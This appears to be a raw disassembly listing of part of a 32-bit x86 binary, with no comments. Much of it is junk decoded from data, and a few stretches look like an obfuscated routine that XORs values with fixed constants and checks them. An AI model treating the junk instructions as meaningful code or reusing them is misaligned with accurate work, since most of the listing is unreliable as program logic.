  409b46:	popf   
  409b47:	jno    0x409b56
  409b49:	stos   DWORD PTR es:[edi],eax
  409b4a:	ret    
  409b4b:	shl    BYTE PTR [bp+0x56cd],0xab
  409b51:	hlt    
  409b52:	add    DWORD PTR [edx],esp
  409b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b55:	adc    ah,BYTE PTR ds:0x6aa94800
  409b5b:	test   al,0x21
  409b5d:	sub    ecx,DWORD PTR [ebx+0xd]
  409b60:	aas    
  409b61:	mov    eax,ds:0x578e68d5
  409b66:	push   ss
  409b67:	ds dec edi
  409b69:	repz and esi,DWORD PTR [ecx]
  409b6c:	sub    edx,DWORD PTR [edx+0x7]
  409b6f:	aas    
  409b70:	out    0xf4,al
  409b72:	es (bad) 
  409b74:	hlt    
  409b75:	push   ecx
  409b76:	adc    al,0x4f
  409b78:	cmp    al,BYTE PTR [eax+0x11]
  409b7b:	and    eax,0xec15472a
  409b80:	push   cs
  409b81:	mov    ecx,ds
  409b83:	pop    ss
  409b84:	(bad)  
  409b85:	sbb    eax,0xa515df7a
  409b8a:	call   0x522254c7
  409b8f:	add    eax,0x32351eae
  409b94:	js     0x409b28
  409b96:	dec    eax
  409b97:	call   0xe3c8:0xa71d8f3e
  409b9e:	ja     0x409b37
  409ba0:	mov    esi,0x59990c81
  409ba5:	pop    edx
  409ba6:	scas   eax,DWORD PTR es:[edi]
  409ba7:	nop
  409ba8:	push   eax
  409ba9:	xchg   esi,eax
  409baa:	xor    edx,edx
  409bac:	or     eax,edx
  409bae:	add    eax,DWORD PTR ds:0x4225d8
  409bb4:	mov    DWORD PTR [ebp+0x14],eax
  409bb7:	mov    eax,DWORD PTR [ebp-0x60]
  409bba:	mov    ecx,DWORD PTR [ebp-0x5c]
  409bbd:	shrd   eax,ecx,0x2
  409bc1:	shr    ecx,0x2
  409bc4:	mov    ecx,DWORD PTR [ebp-0x60]
  409bc7:	mov    edx,DWORD PTR [ebp-0x5c]
  409bca:	xor    eax,edi
  409bcc:	shl    ecx,0x1e
  409bcf:	xor    edx,edx
  409bd1:	or     eax,edx
  409bd3:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409bd7:	mov    eax,DWORD PTR [ebp+0x14]
  409bda:	or     BYTE PTR [eax],cl
  409bdc:	mov    eax,DWORD PTR [ebp-0x48]
  409bdf:	mov    ecx,DWORD PTR [ebp-0x44]
  409be2:	shrd   eax,ecx,0x2
  409be6:	shr    ecx,0x2
  409be9:	mov    ecx,DWORD PTR [ebp-0x48]
  409bec:	mov    edx,DWORD PTR [ebp-0x44]
  409bef:	xor    eax,edi
  409bf1:	xor    edx,edx
  409bf3:	or     eax,edx
  409bf5:	add    eax,DWORD PTR ds:0x4225d8
  409bfb:	shl    ecx,0x1e
  409bfe:	mov    DWORD PTR [ebp+0x14],eax
  409c01:	mov    eax,DWORD PTR [ebp-0x48]
  409c04:	mov    ecx,DWORD PTR [ebp-0x44]
  409c07:	shrd   eax,ecx,0x2
  409c0b:	shr    ecx,0x2
  409c0e:	mov    ecx,DWORD PTR [ebp-0x48]
  409c11:	mov    edx,DWORD PTR [ebp-0x44]
  409c14:	xor    eax,edi
  409c16:	shl    ecx,0x1e
  409c19:	xor    edx,edx
  409c1b:	or     eax,edx
  409c1d:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409c21:	mov    eax,DWORD PTR [ebp+0x14]
  409c24:	add    BYTE PTR [eax],cl
  409c26:	mov    eax,DWORD PTR [ebp-0x38]
  409c29:	mov    ecx,DWORD PTR [ebp-0x34]
  409c2c:	shrd   eax,ecx,0x2
  409c30:	shr    ecx,0x2
  409c33:	mov    ecx,DWORD PTR [ebp-0x38]
  409c36:	mov    edx,DWORD PTR [ebp-0x34]
  409c39:	xor    edx,edx
  409c3b:	xor    eax,edi
  409c3d:	or     eax,edx
  409c3f:	add    eax,DWORD PTR ds:0x4225d8
  409c45:	shl    ecx,0x1e
  409c48:	mov    ecx,DWORD PTR [ebp-0x38]
  409c4b:	mov    edx,DWORD PTR [ebp-0x34]
  409c4e:	shrd   ecx,edx,0x2
  409c52:	xor    ecx,edi
  409c54:	shr    edx,0x2
  409c57:	mov    edx,DWORD PTR [ebp-0x38]
  409c5a:	mov    edi,DWORD PTR [ebp-0x34]
  409c5d:	xor    edi,edi
  409c5f:	or     ecx,edi
  409c61:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  409c65:	or     BYTE PTR [eax],cl
  409c67:	shl    edx,0x1e
  409c6a:	mov    edx,DWORD PTR [ebx]
  409c6c:	mov    eax,DWORD PTR [ebx+0x4]
  409c6f:	mov    edi,DWORD PTR [ebx]
  409c71:	mov    ecx,DWORD PTR [ebx+0x4]
  409c74:	xor    edx,0xca79a577
  409c7a:	xor    eax,0x9c1b89e8
  409c7f:	shrd   edx,eax,0x2
  409c83:	xor    ecx,ecx
  409c85:	or     ecx,edx
  409c87:	mov    DWORD PTR [ebp+0x8],ecx
  409c8a:	mov    ecx,DWORD PTR [esi]
  409c8c:	mov    edx,DWORD PTR [esi+0x4]
  409c8f:	xor    edx,0x9c1b89e8
  409c95:	xor    ecx,0xca79a577
  409c9b:	mov    DWORD PTR [ebp+0x14],ecx
  409c9e:	mov    ecx,edx
  409ca0:	mov    edx,DWORD PTR [ebp+0x14]
  409ca3:	shrd   edx,ecx,0x2
  409ca7:	shr    eax,0x2
  409caa:	shl    edi,0x1e
  409cad:	mov    DWORD PTR [ebp-0x6c],eax
  409cb0:	mov    DWORD PTR [ebp-0x70],edx
  409cb3:	mov    edx,DWORD PTR [esi]
  409cb5:	mov    eax,0x40000000
  409cba:	xor    edi,eax
  409cbc:	or     edi,DWORD PTR [ebp-0x6c]
  409cbf:	mov    DWORD PTR [ebp+0x14],edx
  409cc2:	shl    DWORD PTR [ebp+0x14],0x1e
  409cc6:	xor    DWORD PTR [ebp+0x14],eax
  409cc9:	mov    DWORD PTR [ebp+0xc],edi
  409ccc:	jmp    0x40a0aa
  409cd1:	jbe    0x409d4e
  409cd3:	fstp   TBYTE PTR [edx+ebx*8-0x78e4c9e4]
  409cda:	ins    DWORD PTR es:[edi],dx
  409cdb:	cmp    DWORD PTR [edx+eax*1+0x3b],0x8
  409ce0:	push   0xffffffcd
  409ce2:	cmp    DWORD PTR [eax],ebx
  409ce4:	sbb    BYTE PTR [esi+0x17181812],bl
  409cea:	aad    0xcb
  409cec:	sub    BYTE PTR [eax-0x6ed838df],cl
  409cf2:	(bad)  
  409cf3:	shr    esp,cl
  409cf5:	loopne 0x409cf7
  409cf7:	xchg   ecx,eax
  409cf8:	retf   0xbd76
  409cfb:	idiv   DWORD PTR [esi]
  409cfd:	(bad)  
  409cfe:	loopne 0x409d74
  409d00:	in     eax,dx
  409d01:	enter  0x815,0xde
  409d05:	je     0x409cbc
  409d07:	(bad)  
  409d08:	(bad)  
  409d09:	mov    ecx,0x3782d6e2
  409d0e:	cmp    eax,0x26e03d05
  409d13:	into   
  409d14:	sbb    DWORD PTR [edx-0x7e58fac0],esp
  409d1a:	lds    edx,FWORD PTR [edx-0x7bdb631e]
  409d20:	lock sub bh,BYTE PTR [ecx-0x522fcbec]
  409d27:	shr    BYTE PTR [edi],cl
  409d29:	retf   
  409d2a:	out    dx,eax
  409d2b:	inc    edi
  409d2c:	or     eax,0x91a8dcf4
  409d31:	aam    0x22
  409d33:	adc    esp,DWORD PTR ds:0xf26e013b
  409d39:	push   esi
  409d3a:	jae    0x409dad
  409d3c:	ss jne 0x409cd5
  409d3f:	hlt    
  409d40:	push   edx
  409d41:	dec    eax
  409d42:	bound  eax,QWORD PTR [edx]
  409d44:	mov    ebx,0xa8c7f6b1
  409d49:	jle    0x409d0a
  409d4b:	dec    eax
  409d4c:	push   edi
  409d4d:	or     dh,BYTE PTR [ecx]
  409d4f:	imul   ecx,DWORD PTR [ebx],0xa7ddd1b6
  409d55:	icebp  
  409d56:	jbe    0x409da5
  409d58:	mov    ah,0x47
  409d5a:	mov    WORD PTR [ebx],fs
  409d5c:	retf   
  409d5d:	loopne 0x409d2d
  409d5f:	cmp    cl,BYTE PTR [edi-0x403e0b9]
  409d65:	dec    esi
  409d66:	int3   
  409d67:	(bad)  
  409d68:	push   edx
  409d69:	gs jne 0x409d01
  409d6c:	dec    edx
  409d6d:	mov    ebx,0x1105d5fd
  409d72:	ds sbb eax,0xa0f9632a
  409d78:	pusha  
  409d79:	sbb    DWORD PTR [ecx+0x5cf80074],ebp
  409d7f:	push   0x2d03a856
  409d84:	fst    DWORD PTR [edx+0x4ecd69a0]
  409d8a:	pushf  
  409d8b:	popf   
  409d8c:	and    BYTE PTR [esp+edx*8+0x0],ah
  409d90:	sub    bh,dl
  409d92:	dec    esp
  409d93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d94:	je     0x409dfa
  409d96:	sub    DWORD PTR [bx-0x120a],edx
  409d9b:	adc    eax,0x584f122c
  409da0:	sbb    ch,BYTE PTR [esi+0x37701f26]
  409da6:	pop    edi
  409da7:	sub    esi,eax
  409da9:	sbb    ecx,DWORD PTR [edx-0x5bf6f97f]
  409daf:	stc    
  409db0:	or     bl,dh
  409db2:	into   
  409db3:	or     eax,DWORD PTR [ebx+0x86968f9]
  409db9:	mov    bh,0x9d
  409dbb:	push   ecx
  409dbc:	in     eax,0xc6
  409dbe:	hlt    
  409dbf:	into   
  409dc0:	mov    dh,0xe6
  409dc2:	cli    
  409dc3:	call   0xee6ea9c6
  409dc8:	sti    
  409dc9:	outs   dx,DWORD PTR ds:[esi]
  409dca:	test   BYTE PTR [ecx-0x17],al
  409dcd:	jb     0x409dfe
  409dcf:	push   edx
  409dd0:	inc    ebp
  409dd1:	xor    al,0xfc
  409dd3:	les    edx,FWORD PTR [ebp-0x11]
  409dd6:	or     eax,0x88cbbf7d
  409ddb:	mov    ecx,0xb8c08bfc
  409de0:	cld    
  409de1:	or     edx,DWORD PTR [ecx+0x65]
  409de4:	push   eax
  409de5:	test   ebx,0xc2dd821a
  409deb:	dec    esp
  409dec:	xchg   esp,eax
  409ded:	loop   0x409dc5
  409def:	jecxz  0x409de1
  409df1:	ret    
  409df2:	div    BYTE PTR [edi+ecx*2-0x2ae20ae8]
  409df9:	inc    eax
  409dfa:	cmc    
  409dfb:	popa   
  409dfc:	mov    bl,BYTE PTR [eax]
  409dfe:	adc    dl,BYTE PTR [eax-0x2f2d012a]
  409e04:	lods   eax,DWORD PTR ds:[esi]
  409e05:	adc    BYTE PTR [ebx-0x25],bh
  409e08:	leave  
  409e09:	cli    
  409e0a:	into   
  409e0b:	sbb    BYTE PTR [ebx+eax*8+0x728ad01f],al
  409e12:	pop    ds
  409e13:	mov    esp,es
  409e15:	(bad)  
  409e16:	clc    
  409e17:	(bad)  
  409e18:	push   0xffffff83
  409e1a:	mov    al,ds:0x42e78c37
  409e1f:	xchg   ebx,eax
  409e20:	scas   al,BYTE PTR es:[edi]
  409e21:	push   0xc
  409e23:	scas   al,BYTE PTR es:[edi]
  409e24:	fld    QWORD PTR [edi-0x2435eae5]
  409e2a:	mov    ah,0xae
  409e2c:	aaa    
  409e2d:	jmp    0x85f8:0x60729cd3
  409e34:	adc    eax,0xa4250ca4
  409e39:	ret    
  409e3a:	dec    eax
  409e3b:	adc    al,0xe6
  409e3d:	pop    edi
  409e3e:	(bad)  
  409e3f:	int3   
  409e40:	les    esp,FWORD PTR [edx]
  409e42:	aas    
  409e43:	inc    esi
  409e44:	push   ss
  409e45:	(bad)  
  409e46:	xor    ebp,DWORD PTR [ecx-0x3d]
  409e49:	cs adc eax,0x54df6f2c
  409e4f:	sub    BYTE PTR [ebx],bl
  409e51:	cmp    dl,BYTE PTR [ecx+edi*1+0x52]
  409e55:	pop    esp
  409e56:	imul   ebp,DWORD PTR [esi-0x292f08b8],0x64d640af
  409e60:	mov    ds:0xa8d74287,al
  409e65:	leave  
  409e66:	inc    edx
  409e67:	sub    edx,DWORD PTR [ebx-0x7e355a9]
  409e6d:	jle    0x409ec7
  409e6f:	test   BYTE PTR [edx+eiz*4+0x7b636986],ah
  409e76:	out    0xd2,eax
  409e78:	push   0xe62c268a
  409e7d:	jge    0x409eb2
  409e7f:	les    esi,FWORD PTR [edx+0x36]
  409e82:	out    dx,al
  409e83:	pop    esi
  409e84:	jne    0x409ef2
  409e86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e87:	mov    DWORD PTR [ebp-0x78],eax
  409e8a:	call   0x3b4f4d69
  409e8f:	xchg   BYTE PTR [edx],cl
  409e91:	xchg   ebx,eax
  409e92:	stos   DWORD PTR es:[edi],eax
  409e93:	mov    al,ds:0x37b3316c
  409e98:	nop
  409e99:	and    dl,BYTE PTR [eax-0x75]
  409e9c:	mov    cl,0xb8
  409e9e:	mov    al,ds:0x11d747b
  409ea3:	leave  
  409ea4:	outs   dx,DWORD PTR ds:[esi]
  409ea5:	loopne 0x409e56
  409ea7:	mov    bl,0xba
  409ea9:	jns    0x409ec3
  409eab:	add    al,0x34
  409ead:	cmp    eax,0x2e7b10cc
  409eb2:	fsub   QWORD PTR [edi+0x357df68f]
  409eb8:	(bad)  
  409eb9:	lods   al,BYTE PTR ds:[esi]
  409eba:	inc    ebp
  409ebb:	mov    bh,0x55
  409ebd:	dec    esi
  409ebe:	sub    eax,0xf0294429
  409ec3:	loope  0x409ece
  409ec5:	inc    edx
  409ec6:	arpl   WORD PTR [eax],ax
  409ec8:	cmp    bh,cl
  409eca:	arpl   cx,si
  409ecc:	imul   ecx,esi,0xffffff84
  409ecf:	sub    esp,DWORD PTR [edi+0x63]
  409ed2:	lahf   
  409ed3:	adc    edx,edi
  409ed5:	push   0xa6286673
  409eda:	and    BYTE PTR [esi+ecx*2+0x3e2468b3],0xdb
  409ee2:	and    al,0xa0
  409ee4:	dec    esp
  409ee5:	xor    al,0xb0
  409ee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ee8:	retf   0xe8e2
  409eeb:	pop    ds
  409eec:	cmp    edx,ebp
  409eee:	sbb    DWORD PTR [esi+0x57],eax
  409ef1:	jb     0x409e93
  409ef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ef5:	xor    ecx,edx
  409ef7:	xchg   esp,eax
  409ef8:	mov    bh,0x94
  409efa:	add    BYTE PTR [esi-0x1026525a],0x72
  409f01:	sti    
  409f02:	mov    edx,0x94a61b2d
  409f07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f08:	add    edx,edx
  409f0a:	xchg   edx,ebp
  409f0c:	retf   
  409f0d:	or     DWORD PTR [edi+0x21],esi
  409f10:	pop    ebp
  409f11:	pop    ebp
  409f12:	ss loopne 0x409f53
  409f15:	popf   
  409f16:	arpl   WORD PTR [edi],sp
  409f18:	push   edi
  409f19:	mov    esi,0x19b8bdf6
  409f1e:	cmc    
  409f1f:	mov    esp,0x435eb093
  409f24:	retf   
  409f25:	xor    edx,DWORD PTR [edx+0x68]
  409f28:	rcl    bl,0x7e
  409f2b:	out    0x81,eax
  409f2d:	add    al,0xcd
  409f2f:	xlat   BYTE PTR ds:[ebx]
  409f30:	mov    ch,ah
  409f32:	fwait
  409f33:	es or  eax,0x1071559b
  409f39:	xchg   edi,ebp
  409f3b:	shl    BYTE PTR [edx],cl
  409f3d:	lock into 
  409f3f:	fisubr DWORD PTR [ecx-0x1013a940]
  409f45:	je     0x409f3e
  409f47:	jle    0x409fa8
  409f49:	inc    BYTE PTR fs:[edi]
  409f4c:	inc    edi
  409f4d:	sub    BYTE PTR [ecx-0x4d],ah
  409f50:	mov    ah,0x76
  409f52:	mov    ch,0x70
  409f54:	fcomip st,st(4)
  409f56:	hlt    
  409f57:	bswap  esi
  409f59:	mov    ss,WORD PTR [eax+edx*8-0x83e6887]
  409f60:	adc    cl,BYTE PTR [edx-0x40]
  409f63:	mov    edx,0xfe379df1
  409f68:	mov    ah,0xc0
  409f6a:	sbb    eax,0x7cb19c14
  409f6f:	repnz test ecx,0x7c4507db
  409f76:	popf   
  409f77:	mov    eax,0xd1af902a
  409f7c:	dec    ecx
  409f7d:	or     ch,ch
  409f7f:	mov    ds:0xa110d95d,al
  409f84:	push   ds
  409f85:	jmp    0x3138d388
  409f8a:	dec    ebp
  409f8b:	push   edx
  409f8c:	xor    edx,esp
  409f8e:	pushf  
  409f8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f90:	xchg   ecx,eax
  409f91:	mov    dh,0xbf
  409f93:	pushf  
  409f94:	jecxz  0x409fb7
  409f96:	daa    
  409f97:	psrld  mm1,QWORD PTR [eax+0x7649ee4c]
  409f9e:	mov    ch,0x8
  409fa0:	push   eax
  409fa1:	xor    ebp,DWORD PTR [edi]
  409fa3:	pop    es
  409fa4:	sub    DWORD PTR [esi+edx*1+0x30],ecx
  409fa8:	(bad)  
  409fa9:	sub    al,0x3b
  409fab:	adc    bl,BYTE PTR [ecx+0x3e769e3c]
  409fb1:	pop    esp
  409fb2:	retf   0xcf90
  409fb5:	dec    ecx
  409fb6:	test   ebp,edx
  409fb8:	pop    eax
  409fb9:	jae    0x409f7d
  409fbb:	mov    WORD PTR [ebx-0x28],fs
  409fbe:	mov    ch,BYTE PTR [edx+eax*8]
  409fc1:	inc    esp
  409fc2:	fimul  DWORD PTR [ecx-0x4540e792]
  409fc8:	es inc ebp
  409fca:	aad    0x58
  409fcc:	dec    eax
  409fcd:	or     al,0xbd
  409fcf:	repz dec edi
  409fd1:	xor    DWORD PTR [edx-0x24],edx
  409fd4:	ins    BYTE PTR es:[edi],dx
  409fd5:	rcr    DWORD PTR [edx-0x37446143],0x20
  409fdc:	add    esp,edi
  409fde:	inc    ebx
  409fdf:	push   edx
  409fe0:	cmp    al,0xa
  409fe2:	stos   BYTE PTR es:[edi],al
  409fe3:	in     al,0xbf
  409fe5:	mov    dl,0xd6
  409fe7:	mov    al,0x3
  409fe9:	cmc    
  409fea:	pop    ebp
  409feb:	cld    
  409fec:	(bad)  
  409fef:	adc    eax,0x1e2feb2a
  409ff4:	lods   eax,DWORD PTR ds:[esi]
  409ff5:	call   0x4598:0xd27bed23
  409ffc:	test   al,0x66
  409ffe:	push   ebp
  409fff:	sbb    cl,BYTE PTR [esi+0x45]
  40a002:	loopne 0x409fa3
  40a004:	mov    esi,DWORD PTR [eax+0x30]
  40a007:	cs sahf 
  40a009:	ret    0x54a8
  40a00c:	(bad)  
  40a00d:	outs   dx,DWORD PTR ds:[esi]
  40a00e:	jne    0x409ffc
  40a010:	sub    dh,BYTE PTR [ecx+0x68b2834]
  40a016:	cmp    eax,0x7b2e4ff4
  40a01b:	cli    
  40a01c:	loopne 0x409fe9
  40a01e:	push   ebx
  40a01f:	pusha  
  40a020:	retf   
  40a021:	mov    ah,0xf0
  40a023:	(bad)  
  40a024:	sub    esp,ecx
  40a026:	(bad)  
  40a027:	adc    BYTE PTR [esi],al
  40a029:	mov    esi,0x55f5f9b4
  40a02e:	std    
  40a02f:	cmp    ch,bh
  40a031:	pop    ss
  40a032:	test   al,0x3e
  40a034:	mov    edx,esi
  40a036:	lods   al,BYTE PTR ds:[esi]
  40a037:	fbld   TBYTE PTR [ecx-0x1ed7162c]
  40a03d:	pop    eax
  40a03e:	loope  0x40a05d
  40a040:	jl     0x409ffe
  40a042:	inc    esi
  40a043:	jle    0x409fcc
  40a045:	arpl   cx,ax
  40a047:	jmp    0xc33cda0f
  40a04c:	adc    eax,0x7f95d203
  40a051:	inc    edi
  40a052:	jae    0x409fea
  40a054:	fs popa 
  40a056:	iret   
  40a057:	mov    eax,0xe64a1ddc
  40a05c:	cmc    
  40a05d:	sar    DWORD PTR [eax-0x12],cl
  40a060:	mov    ebp,0x37f9e8c7
  40a065:	ja     0x40a0a9
  40a067:	ds jecxz 0x40a0a1
  40a06a:	fs in  eax,0xc5
  40a06d:	mov    ebx,0x17441873
  40a072:	pop    ebp
  40a073:	push   ds
  40a074:	or     esi,edx
  40a076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a077:	pushf  
  40a078:	pop    ecx
  40a079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a07a:	push   edx
  40a07b:	jecxz  0x40a07b
  40a07d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a07e:	(bad)  
  40a07f:	lds    edx,FWORD PTR [edi]
  40a081:	mov    ds,WORD PTR [ebp+0x7b]
  40a084:	or     eax,0xbc443694
  40a089:	jge    0x40a047
  40a08b:	pop    eax
  40a08c:	cmp    al,0x2d
  40a08e:	adc    edi,eax
  40a090:	(bad)  
  40a091:	mov    edi,0xd7fab3e7
  40a096:	xchg   ecx,eax
  40a097:	push   ebp
  40a098:	int    0x88
  40a09a:	or     ebp,esi
  40a09c:	bound  edi,QWORD PTR [eax]
  40a09e:	mov    ah,0x8c
  40a0a0:	popa   
  40a0a1:	jae    0x40a102
  40a0a3:	or     BYTE PTR [eax],0xa
  40a0a6:	pop    es
  40a0a7:	pop    ebx
  40a0a8:	call   0x7d8b:0x47e8b6c
  40a0af:	adc    al,0x33
  40a0b1:	ror    BYTE PTR [ebx],cl
  40a0b3:	push   ebp
  40a0b4:	nop
  40a0b5:	shr    ecx,0x2
  40a0b8:	or     edi,ecx
  40a0ba:	cmp    edx,DWORD PTR [ebp+0x8]
  40a0bd:	jne    0x40a9b0
  40a0c3:	cmp    edi,DWORD PTR [ebp+0xc]
  40a0c6:	jne    0x40a9b0
  40a0cc:	jmp    0x40a926
  40a0d1:	mov    eax,DWORD PTR [esi]
  40a0d3:	mov    edx,DWORD PTR [esi+0x4]
  40a0d6:	mov    eax,DWORD PTR [esi]
  40a0d8:	mov    edx,DWORD PTR [esi+0x4]
  40a0db:	xor    eax,0xca79a577
  40a0e0:	xor    edx,ecx
  40a0e2:	mov    ecx,eax
  40a0e4:	mov    eax,edx
  40a0e6:	shrd   ecx,eax,0x2
  40a0ea:	shr    eax,0x2
  40a0ed:	mov    DWORD PTR [ebp+0xc],eax
  40a0f0:	mov    eax,DWORD PTR [esi]
  40a0f2:	mov    edx,DWORD PTR [esi+0x4]
  40a0f5:	mov    edx,eax
  40a0f7:	xor    eax,eax
  40a0f9:	or     eax,ecx
  40a0fb:	mov    ecx,DWORD PTR [ebx]
  40a0fd:	shl    edx,0x1e
  40a100:	xor    edx,0x40000000
  40a106:	mov    DWORD PTR [ebp+0x10],eax
  40a109:	mov    eax,edx
  40a10b:	or     eax,DWORD PTR [ebp+0xc]
  40a10e:	mov    edx,DWORD PTR [ebx+0x4]
  40a111:	push   eax
  40a112:	push   DWORD PTR [ebp+0x10]
  40a115:	push   edx
  40a116:	push   ecx
  40a117:	jmp    0x40a4f5
  40a11c:	std    
  40a11d:	dec    ecx
  40a11e:	mov    ah,0xd2
  40a120:	sub    al,0x22
  40a122:	fidivr DWORD PTR [edi]
  40a124:	test   al,0x29
  40a126:	push   ebp
  40a127:	stos   BYTE PTR es:[edi],al
  40a128:	rcl    DWORD PTR gs:[esi],1
  40a12b:	stos   BYTE PTR es:[edi],al
  40a12c:	push   edx
  40a12d:	xor    ebx,DWORD PTR [eax]
  40a12f:	sbb    BYTE PTR [esi-0x6fe7e7ee],bl
  40a135:	cli    
  40a136:	adc    al,0x29
  40a138:	adc    dh,0xb6
  40a13b:	(bad)  
  40a13c:	retf   0xa217
  40a13f:	icebp  
  40a140:	popa   
  40a141:	lds    esp,FWORD PTR [edx]
  40a143:	dec    edi
  40a144:	xor    ebp,edi
  40a146:	add    BYTE PTR [ebx],ah
  40a148:	pop    es
  40a149:	imul   eax,DWORD PTR [esi-0x6d],0x1fda3575
  40a150:	mov    ecx,0x499ef813
  40a155:	sbb    bl,bh
  40a157:	cld    
  40a158:	ret    0x5f1b
  40a15b:	jle    0x40a1aa
  40a15d:	xchg   esi,eax
  40a15e:	fisubr DWORD PTR [edx+0x19]
  40a161:	fist   WORD PTR [edi]
  40a163:	jl     0x40a119
  40a165:	pop    edi
  40a166:	sahf   
  40a167:	out    dx,eax
  40a168:	jl     0x40a112
  40a16a:	mov    dl,0x91
  40a16c:	pop    ebx
  40a16d:	pop    es
  40a16e:	jmp    DWORD PTR [ecx-0x671878ee]
  40a174:	inc    edi
  40a175:	aam    0xd1
  40a177:	ds iret 
  40a179:	popa   
  40a17a:	or     al,0xcc
  40a17c:	repz mov ebx,0x7a1fead0
  40a182:	xchg   ebp,eax
  40a183:	push   cs
  40a184:	mov    edx,0xc77befff
  40a189:	pop    esp
  40a18a:	lock cdq 
  40a18c:	call   0xc5156a01
  40a191:	dec    ecx
  40a192:	lea    edi,ds:0x3dc58cff
  40a198:	push   eax
  40a199:	popf   
  40a19a:	out    dx,al
  40a19b:	les    edi,FWORD PTR [edx]
  40a19d:	xchg   eax,eax
  40a19f:	pop    edi
  40a1a0:	call   0x1cdd1f1d
  40a1a5:	test   eax,0xf8e6ab4a
  40a1aa:	xchg   esi,eax
  40a1ab:	xchg   edi,eax
  40a1ac:	sub    BYTE PTR [esi-0x34],ch
  40a1af:	std    
  40a1b0:	ins    DWORD PTR es:[edi],dx
  40a1b1:	test   al,0x46
  40a1b3:	mov    ds:0x4e6fc3cc,al
  40a1b8:	mov    esi,0x5f960a7c
  40a1bd:	xchg   edi,eax
  40a1be:	in     eax,0x9a
  40a1c0:	sbb    dl,BYTE PTR [esi+0x56e05ed0]
  40a1c6:	shr    DWORD PTR [ecx],1
  40a1c8:	push   0xfffffffe
  40a1ca:	and    eax,0xd13b19b7
  40a1cf:	inc    ecx
  40a1d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1d1:	cli    
  40a1d2:	(bad)  
  40a1d3:	and    BYTE PTR [ecx+0x61e47977],ah
  40a1d9:	int    0xb5
  40a1db:	icebp  
  40a1dc:	jns    0xf49b9047
  40a1e2:	pop    eax
  40a1e3:	cmc    
  40a1e4:	push   edi
  40a1e5:	popf   
  40a1e6:	outs   dx,DWORD PTR ds:[esi]
  40a1e7:	ret    
  40a1e8:	adc    eax,0xb7f47626
  40a1ed:	in     eax,dx
  40a1ee:	outs   dx,BYTE PTR ds:[esi]
  40a1ef:	iret   
  40a1f0:	jne    0x40a219
  40a1f2:	sbb    al,0x73
  40a1f4:	jne    0x40a25d
  40a1f6:	popf   
  40a1f7:	cwde   
  40a1f8:	sub    eax,0x9817bc66
  40a1fd:	scas   eax,DWORD PTR es:[edi]
  40a1fe:	sti    
  40a1ff:	jns    0x40a268
  40a201:	lds    ecx,FWORD PTR [eax]
  40a203:	add    dh,BYTE PTR [eax-0xc]
  40a206:	adc    al,0x3b
  40a208:	ret    0xb190
  40a20b:	dec    ebp
  40a20c:	mov    DWORD PTR [ecx],esp
  40a20e:	call   0xac4a:0xa108fb04
  40a215:	ja     0x40a289
  40a217:	outs   dx,DWORD PTR ds:[esi]
  40a218:	pop    edx
  40a219:	outs   dx,BYTE PTR ds:[esi]
  40a21a:	stos   DWORD PTR es:[edi],eax
  40a21b:	sub    eax,0x8d61f632
  40a220:	loopne 0x40a223
  40a222:	es iret 
  40a224:	and    ebx,ebp
  40a226:	adc    al,0x81
  40a228:	and    BYTE PTR [ebp-0x69],0x36
  40a22c:	imul   edx,DWORD PTR [edi-0x2b33e8bb],0xd715b9ac
  40a236:	push   esp
  40a237:	ret    0x72e4
  40a23a:	xor    al,BYTE PTR ds:0x3997ae9d
  40a240:	(bad)  
  40a241:	mov    dl,0x51
  40a243:	(bad)  
  40a244:	push   ecx
  40a245:	jnp    0x40a1fd
  40a247:	loop   0x40a1f1
  40a249:	cmp    eax,0xa23c4a46
  40a24e:	mov    ecx,fs
  40a250:	dec    eax
  40a251:	mov    esi,DWORD PTR [ebx]
  40a253:	mov    cl,0x41
  40a255:	mov    dh,0x48
  40a257:	dec    ebx
  40a258:	leave  
  40a259:	mov    al,BYTE PTR [ecx+0x26]
  40a25c:	add    BYTE PTR [ebp+eax*4-0x48],0xd3
  40a261:	pop    edi
  40a262:	mov    WORD PTR [ebx],ds
  40a264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a265:	lds    ecx,FWORD PTR [esi-0x7c]
  40a268:	mov    al,ds:0x79e9a1d
  40a26d:	shl    edi,1
  40a26f:	pushf  
  40a270:	in     al,dx
  40a271:	pop    ecx
  40a272:	in     eax,0x95
  40a274:	loope  0x40a20c
  40a276:	dec    edi
  40a277:	push   ss
  40a278:	ret    0xbc49
  40a27b:	sbb    edi,DWORD PTR [ecx]
  40a27d:	repnz pop esi
  40a27f:	rcl    BYTE PTR [ecx],cl
  40a281:	jae    0x40a2de
  40a283:	imul   edx,DWORD PTR [esi-0x5a],0x27
  40a287:	mov    bl,0xb7
  40a289:	scas   eax,DWORD PTR es:[edi]
  40a28a:	xor    al,0x9d
  40a28c:	xchg   BYTE PTR [esi+edx*2-0x1b],dh
  40a290:	sar    BYTE PTR [ebp+0x1692fa7c],0xed
  40a297:	outs   dx,DWORD PTR ds:[esi]
  40a298:	jmp    0x5888f85d
  40a29d:	scas   al,BYTE PTR es:[edi]
  40a29e:	or     al,BYTE PTR [edx]
  40a2a0:	in     al,0x67
  40a2a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2a3:	shl    BYTE PTR [esi+0x33d4a411],0xff
  40a2aa:	popa   
  40a2ab:	mov    cl,0x4f
  40a2ad:	out    0xa,al
  40a2af:	push   0x40b46d3f
  40a2b4:	fldenv [ebx]
  40a2b6:	sbb    eax,0x67a0896c
  40a2bb:	aaa    
  40a2bc:	test   al,0x88
  40a2be:	mov    ds:0xd9823ae2,al
  40a2c3:	and    ebp,DWORD PTR [ebx-0xf]
  40a2c6:	jl     0x40a26c
  40a2c8:	push   ebx
  40a2c9:	gs pop edi
